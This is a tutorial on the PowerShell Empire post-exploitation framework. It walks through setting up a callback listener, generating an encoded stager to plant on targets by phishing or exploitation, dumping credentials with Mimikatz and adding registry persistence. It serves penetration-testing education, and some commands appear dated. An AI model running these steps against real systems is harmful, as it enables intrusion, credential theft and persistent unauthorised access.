# Powershell Empire

## Step-by-Step Tutorial on Using PowerShell Empire

PowerShell Empire is a post-exploitation framework that enables attackers and penetration testers to operate covertly on a compromised system. Below is a detailed guide to setting up and using PowerShell Empire, from installation to executing basic commands.

### Prerequisites

- **Operating System**: Kali Linux or any other Debian-based system is recommended.
- **Python**: PowerShell Empire requires Python 3.7 or above.
- **Git**: Ensure you have Git installed to clone the repository.
- **Internet Connection**: Required for the initial setup and cloning of repositories.

### Step 1: Install Required Dependencies

Before setting up Empire, ensure your system has all the necessary dependencies.

```bash
sudo apt-get update
sudo apt-get install -y git python3 python3-pip
```

### Step 2: Clone the PowerShell Empire Repository

Clone the Empire repository from GitHub.

```bash
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
```

### Step 3: Install Empire

Navigate to the cloned Empire directory and run the installation script:

```bash
./setup/install.sh
```

This script will handle the installation of all dependencies, including Python packages. Follow any prompts that appear during the installation process.

### Step 4: Configure Empire

Once the installation is complete, start the Empire server:

```bash
./empire
```

When you run Empire for the first time, you’ll be prompted to create an admin user:

```bash
(Empire) > admin create
```

Follow the prompts to set up a username and password.

### Step 5: Start the Empire Server

After setting up the admin account, start the server using the following command:

```bash
(Empire) > listeners
```

This command will allow you to manage listeners, which are used to handle connections from agents. 

### Step 6: Create a Listener

Listeners are essential for establishing connections with compromised systems. Here’s how to create an HTTP listener:

```bash
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://<your_ip>:<port>
(Empire: listeners/http) > set Port 8080
(Empire: listeners/http) > execute
```

Replace `<your_ip>` with your server’s IP address. The port can be set to any open port (8080 is commonly used).

### Step 7: Generate a Stager

A stager is used to deploy the Empire agent onto a target system. Here’s how to generate a PowerShell stager:

```bash
(Empire) > usestager windows/launcher_bat
(Empire: stager/launcher_bat) > set Listener <listener_name>
(Empire: stager/launcher_bat) > execute
```

This will generate a Base64-encoded PowerShell command that you can use to deploy the stager on the target system.

### Step 8: Deploy the Stager on the Target System

To gain control of a target system, you need to execute the stager on it. This can be done through various methods, such as phishing, exploiting vulnerabilities, or using social engineering.

Once executed, the stager will connect back to your Empire listener, establishing a session.

### Step 9: Interact with the Agent

After the stager successfully executes, an agent will appear under the `agents` tab in Empire. To interact with the agent:

```bash
(Empire) > agents
(Empire: agents) > interact <agent_name>
```

### Step 10: Execute Commands on the Compromised System

Once you have an active session with the agent, you can execute various post-exploitation modules. For example, to gather system information:

```bash
(Empire: <agent_name>) > sysinfo
```

Or to run Mimikatz to dump credentials:

```bash
(Empire: <agent_name>) > usemodule credentials/mimikatz/logonpasswords
(Empire: module/credentials/mimikatz/logonpasswords) > execute
```

### Step 11: Maintain Persistence

To ensure you maintain access, you can set up persistence mechanisms, such as a registry-based backdoor:

```bash
(Empire: <agent_name>) > usemodule persistence/elevated/registry
(Empire: module/persistence/elevated/registry) > set Listener <listener_name>
(Empire: module/persistence/elevated/registry) > execute
```

### Step 12: Clean Up

After completing your activities, it’s important to clean up:

1. **Kill Agents**: 
    ```bash
    (Empire: <agent_name>) > agents kill <agent_name>
    ```
2. **Remove Listeners**:
    ```bash
    (Empire: listeners) > listeners kill <listener_name>
    ```

3. **Terminate Empire**:
    ```bash
    (Empire) > exit
    ```

# Conclusion

PowerShell Empire is a powerful tool for post-exploitation tasks, offering a wide range of modules and capabilities. Always remember that using such tools without proper authorization is illegal and unethical. This tutorial is intended for educational purposes, to be used within legal boundaries such as penetration testing within your own environment or with explicit permission.
